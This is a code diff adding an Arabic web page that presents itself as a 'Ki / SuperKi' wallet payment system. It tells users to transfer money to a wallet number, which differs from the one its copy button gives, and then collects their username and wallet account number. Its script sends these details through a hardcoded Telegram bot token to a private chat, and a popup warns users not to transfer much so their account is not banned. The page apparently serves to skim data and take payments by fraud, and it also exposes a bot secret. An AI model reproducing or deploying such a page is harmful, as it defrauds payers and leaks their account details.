@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.9">
+    <title>دفع عبر تطبيق كي او سوبر كي</title>
+    <style>
+        body {
+            font-family: 'Tahoma', sans-serif;
+            background-color: #FFF9C4; /* خلفية صفراء فاتحة */
+            margin: 0;
+            padding: 5px; /* تصغير للنصف */
+            color: #5D4037; /* لون نص بني داكن */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-size: 14px;
+        }
+        .container {
+            width: 320px;
+            background: #FFFDE7; /* أصفر أفتح */
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1); /* تصغير للنصف */
+            overflow: hidden;
+            border: 1px solid #FFD600; /* أصفر ذهبي */
+        }
+        .header {
+            background: #FFD600; /* أصفر ذهبي */
+            color: #5D4037; /* بني داكن */
+            padding: 8px; /* تصغير للنصف */
+            text-align: center;
+            font-size: 16px;
+        }
+        .step {
+            display: none;
+            padding: 10px; /* تصغير للنصف */
+        }
+        .step.active {
+            display: block;
+        }
+        .ki-logo {
+            text-align: center;
+            margin: 8px 0; /* تصغير للنصف */
+        }
+        .ki-logo img {
+            width: 60px;
+            height: 60px;
+            border-radius: 10px;
+            border: 2px solid #FFD600;
+        }
+        .form-group {
+            margin-bottom: 8px; /* تصغير للنصف */
+        }
+        label {
+            display: block;
+            margin-bottom: 4px; /* تصغير للنصف */
+            font-size: 13px;
+            color: #5D4037;
+        }
+        input {
+            width: 100%;
+            padding: 6px; /* تصغير للنصف */
+            border: 1px solid #FFD600;
+            border-radius: 4px;
+            font-size: 13px;
+            background: #FFF9C4;
+            color: #5D4037;
+        }
+        button {
+            background: #FFD600;
+            color: #5D4037;
+            border: none;
+            padding: 8px; /* تصغير للنصف */
+            width: 100%;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px; /* تصغير للنصف */
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #FFC107;
+        }
+        .instructions {
+            background: #FFF9C4;
+            border: 1px dashed #FFD600;
+            border-radius: 5px;
+            padding: 8px; /* تصغير للنصف */
+            margin: 10px 0; /* تصغير للنصف */
+            font-size: 12px;
+        }
+        .copy-section {
+            display: flex;
+            align-items: center;
+            margin: 8px 0; /* تصغير للنصف */
+        }
+        .account-number {
+            flex: 1;
+            background: #FFF9C4;
+            border: 1px solid #FFD600;
+            border-radius: 4px;
+            padding: 6px; /* تصغير للنصف */
+            font-size: 12px;
+            text-align: center;
+        }
+        .copy-btn {
+            background: #FFD600;
+            color: #5D4037;
+            border: none;
+            border-radius: 4px;
+            padding: 6px 8px; /* تصغير للنصف */
+            margin-right: 5px; /* تصغير للنصف */
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background: #FFFDE7;
+            padding: 15px; /* تصغير للنصف */
+            border-radius: 8px;
+            text-align: center;
+            max-width: 280px;
+            border: 2px solid #FFD600;
+        }
+        .popup-content img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>نظام الدفع عبر كي او سوبركي</h1>
+        </div>
+        
+        <div id="step1" class="step active">
+            <div class="ki-logo">
+                <img src="https://play-lh.googleusercontent.com/5yK2h1uLql0JRMmU0hBZnN5yNnqd6k4sxJ1BdPR3wXKcJjlxgR0yW0m5p7X5y9Q5Q=s180-rw" alt="تطبيق كي">
+            </div>
+            
+            <div class="form-group">
+                <label for="amount">مبلغ الدفع (الدينار العراقي)</label>
+                <input type="number" id="amount" placeholder="أدخل المبلغ" required>
+            </div>
+            
+            <button onclick="nextStep()">متابعة</button>
+            
+            <div class="instructions">
+                <h3 style="color:#FF6F00">تعليمات التحويل:</h3>
+                <ol>
+                    <li>افتح تطبيق كي او سوبر كي</li>
+                    <li>اضغط على "تحويل"</li>
+                    <li>اختر "إلى رقم محفظة"</li>
+                    <li>أدخل الرقم: <strong style="color:#FF6F00">6911210786</strong></li>
+                </ol>
+                
+                <div class="copy-section">
+                    <div class="account-number" id="accountToCopy">1234567890</div>
+                    <button class="copy-btn" onclick="copyAccountNumber()">نسخ</button>
+                </div>
+                
+                <ol start="5">
+                    <li>أدخل المبلغ</li>
+                    <li>اضغط "تحويل الان ثم املاء معلومات"</li>
+                </ol>
+            </div>
+        </div>
+        
+        <div id="step2" class="step">
+            <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="اسم المستخدم في موقعنا" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="account">رقم الحساب</label>
+                <input type="text" id="account" placeholder="رقم الحساب في كي" required>
+            </div>
+            
+            <button onclick="submitPayment()">تاكيد الدفع الان</button>
+        </div>
+    </div>
+
+    <div id="popup" class="popup-overlay">
+        <div class="popup-content">
+            <img src="https://play-lh.googleusercontent.com/5yK2h1uLql0JRMmU0hBZnN5yNnqd6k4sxJ1BdPR3wXKcJjlxgR0yW0m5p7X5y9Q5Q=s180-rw" alt="كي">
+            <h2 style="color:#FF6F00">تم تحقق من طلبك </h2>
+            <p>انتضر دقائق لتنفيذ . لاتحول كثيراً حت لايتم حضر حسابك</p>
+            <button onclick="closePopup()">تم</button>
+        </div>
+    </div>
+
+    <script>
+        function nextStep() {
+            const amount = document.getElementById('amount').value;
+            if (!amount || amount <= 0) {
+                alert('الرجاء إدخال مبلغ صحيح');
+                return;
+            }
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+        
+        function submitPayment() {
+            const username = document.getElementById('username').value;
+            const account = document.getElementById('account').value;
+            const amount = document.getElementById('amount').value;
+            
+            if (!username || !account) {
+                alert('الرجاء إدخال جميع البيانات');
+                return;
+            }
+            
+            // إرسال إلى بوت التليجرام
+            sendToTelegram(username, account, amount);
+            
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('popup').style.display = 'flex';
+        }
+        
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('amount').value = '';
+            document.getElementById('username').value = '';
+            document.getElementById('account').value = '';
+        }
+        
+        function copyAccountNumber() {
+            const num = document.getElementById('accountToCopy').innerText;
+            navigator.clipboard.writeText(num).then(() => {
+                alert('تم النسخ: ' + num);
+            }).catch(() => {
+                const t = document.createElement('input');
+                t.value = num;
+                document.body.appendChild(t);
+                t.select();
+                document.execCommand('copy');
+                document.body.removeChild(t);
+                alert('تم النسخ: ' + num);
+            });
+        }
+        
+        function sendToTelegram(username, account, amount) {
+            const botToken = '7187779048:AAG2qZOl6JYI7pr_EJIb6C371HCuxcAZe7A';
+            const chatId = '7154036384';
+            
+            const message = `
+            💳 *طلب دفع جديد عبر كي*
+            ━━━━━━━━━━━━━━
+            👤 الاسم: ${username}
+            🔢 الحساب: ${account}
+            💰 المبلغ: ${amount} ريال
+            `;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+    </script>
+</body>
+</html>
